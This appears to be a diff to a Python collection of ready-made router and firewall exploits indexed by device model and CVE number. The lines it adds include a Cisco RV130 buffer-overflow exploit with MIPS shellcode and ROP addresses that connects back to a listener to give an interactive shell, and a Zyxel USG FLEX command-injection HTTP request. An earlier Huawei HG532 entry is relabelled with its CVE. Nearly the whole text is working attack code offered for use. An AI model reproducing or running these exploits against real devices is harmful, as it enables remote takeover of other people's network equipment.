@@ -1725,7 +1725,7 @@ msf search CVE-2016-6563
 }
 
 model_exp_dic["huawei_HG532"] = {
-    "":
+    "CVE-2017-17215":
 """
 import requests
 
@@ -1745,5 +1745,60 @@ data = '''<?xml version="1.0" ?>
 requests.post('http://192.168.150.9:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
 """
 }
+
+model_exp_dic["Cisco_RV130"] = {
+    "CVE-2020-3331":
+"""
+from pwn import *
+import thread,requests
+context(arch='mips',endian='little',os='linux')
+io     = listen(31337)
+libc   = 0x2af98000
+jmp_a0 = libc + 0x0003D050  # move  $t9,$a0             ; jalr  $a0
+jmp_s0 = libc + 0x000257A0  # addiu $a0,$sp,0x38+var_20 ; jalr  $s0 
+
+shellcode = "\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04\\x28"
+shellcode += "\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01"
+shellcode += "\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01"
+shellcode += "\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x09\\x09\\x01"
+shellcode += "\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xc9\\x0f\\x02\\x24"
+shellcode += "\\x0c\\x09\\x09\\x01\\x79\\x69\\x05\\x3c\\x01\\xff\\xa5\\x34\\x01\\x01\\xa5\\x20"
+shellcode += "\\xf8\\xff\\xa5\\xaf\\x01\\x64\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc\\xff\\xa5\\xaf"
+shellcode += "\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24"
+shellcode += "\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08\\x35\\xec\\xff\\xa8\\xaf"
+shellcode += "\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff\\xa8\\xaf\\xff\\xff\\x07\\x28"
+shellcode += "\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23"
+shellcode += "\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28"
+shellcode += "\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01"
+
+payload = "status_guestnet.asp"+'a'*49+p32(jmp_a0)+0x20*'a'+p32(jmp_s0)+0x18*'a'+shellcode
+paramsPost = {"cmac":"12:af:aa:bb:cc:dd","submit_button":payload,"cip":"192.168.1.100"}
+
+def attack():
+    try: requests.post("https://192.168.1.1/guest_logout.cgi", data=paramsPost, verify=False,timeout=1)
+    except: pass
+
+thread.start_new_thread(attack,())
+io.wait_for_connection()
+log.success("getshell")
+io.interactive()
+"""
+}
+
+model_exp_dic["Zyxel_USG_FLEX_500"] = {
+    "CVE-2022-30525":
+"""
+POST /ztp/cgi-bin/handler HTTP/1.1
+Host: host
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Content-Type: application/json
+Connection: close
+Content-Length: 165
+
+{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"
+:"1","vlanid":"5","mtu":";Command;","data":"hi"}
+"""
+}
+
 
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
